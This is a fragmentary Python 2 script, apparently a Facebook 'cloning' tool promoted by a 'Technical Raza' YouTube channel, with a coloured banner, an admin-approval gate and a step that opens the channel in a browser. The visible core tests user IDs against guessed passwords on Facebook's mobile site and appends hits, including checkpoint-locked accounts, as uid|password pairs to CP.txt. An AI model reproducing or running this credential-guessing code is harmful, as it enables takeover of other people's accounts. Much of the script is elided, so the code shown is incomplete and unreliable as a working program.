...
\033[1;91m[!]\033[1;97m Whatsapp\x1b[1;97m:  \x1b[1;97m          03047269778
\033[1;91m[!]\033[1;97m Yt Channel\x1b[1;97m  :  \x1b[1;97m           Technical Raza
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m             4.0.0
\x1b[1;97m------------------------\x1b[1;97m------------------------×
                                                 """

host="https://www.facebook.com/abukalinkcopykarlia"
ips=None
try:
...
def main():
    ...
    print("\x1b[1;97m-----------------------------------------------------")
    print("\x1b[1;91m [1]\x1b[1;97m  This Option Deleted Choose 2")
...
def reg():
    ...
    print logo
    print ''
    print '\x1b[1;31;1mGet Approvel From Admin '
    print ''
    time.sleep(1)
    try:
...
def reg2():
    ...
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to Subscribe My Channel ')
    os.system('xdg-open https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw')
																																																					...
																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																						...
																																																						if 'checkpoint' in sp:
																																																							...
																																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																								...
																																																								if 'checkpoint' in sp:
																																																									print(' \x1b[1;91m [ALO-CP] '+uid+' | '+ps27+'\033[0;97m')
																																																									cp = open('CP.txt', 'a')
																																																									cp.write(uid+'|'+ps27+'\n')
																																																									cp.close()
																																																									cps.append(uid+ps27)
